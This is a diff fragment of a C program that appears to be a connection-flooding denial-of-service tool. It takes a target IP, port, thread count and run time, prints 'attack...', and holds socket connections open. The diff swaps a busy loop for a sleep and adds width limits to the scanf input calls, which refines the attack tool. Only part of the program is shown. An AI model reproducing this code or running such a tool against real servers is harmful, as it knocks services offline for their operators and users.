@@ -20,20 +20,20 @@ if(inet_pton(AF_INET,ip,&serv_addr.sin_addr)<=0)
 	return;
 connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
 
-while(1);
-	
+while(1)
+sleep(200);
 }
 int main()
 {
 int sec;
 printf("ip:");
-scanf("%s",ip);
+scanf("%20s",ip);
 printf("port:");
-scanf("%d",&port);
+scanf("%20d",&port);
 printf("threads:");
-scanf("%d",&threads);
+scanf("%20d",&threads);
 printf("time of program(sec):");
-scanf("%d",&sec);
+scanf("%20d",&sec);
 puts("attack...");
 
 size_t i;
